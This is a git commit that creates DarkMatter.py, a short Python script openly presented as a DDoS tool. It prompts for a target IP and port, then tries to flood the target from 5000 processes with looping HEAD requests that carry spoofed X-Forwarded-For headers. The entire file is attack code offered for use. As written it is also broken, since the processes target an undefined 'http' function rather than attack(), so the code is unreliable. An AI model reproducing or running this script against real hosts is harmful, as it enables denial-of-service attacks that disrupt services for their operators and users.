496a1475091b6c496798a1c0834294f76b481e56
BGInfinityX <84208271+BGInfinityX@users.noreply.github.com>
2021-05-14 21:48:24 -0300

    Create DarkMatter.py

---
+++ DarkMatter.py
@@ -0,0 +1,59 @@
+import socket
+import os, sys
+import time
+import multiprocessing, random
+
+print("Welcome To DarkMatter DDoS")
+ip = input("IP/Domain: ")
+port = int(input("Port: "))
+
+url = "http://" + str(ip)
+
+def randomip():
+  randip = []
+  randip1 = random.randint(1,255)
+  randip2 = random.randint(1,255)
+  randip3 = random.randint(1,255)
+  randip4 = random.randint(1,255)
+  
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
+  return(randip)
+
+print("[>>>] Starting the attack [<<<]")
+
+
+time.sleep(1)
+
+
+def attack():
+  connection = "Connection: null\r\n"
+  referer = "Referer: null\r\n"
+  forward = "X-Forwarded-For: " + randomip() + "\r\n"
+  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  request = get_host + referer  + connection + forward + "\r\n\r\n"
+  while True:
+    try:
+      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      atk.connect((ip, port))
+      #Attack starts here
+      for y in range(100):
+          atk.send(str.encode(request))
+    except socket.error:
+      time.sleep(.1)
+    except:
+      pass
+
+
+
+def send2attack():
+  for i in range(5000): #Magic Power
+    mp = multiprocessing.Process(target=http)
+    mp.setDaemon = False
+    mp.start() #Magic Starts
+
+send2attack() #61 lines for the most powerful attack, cool?
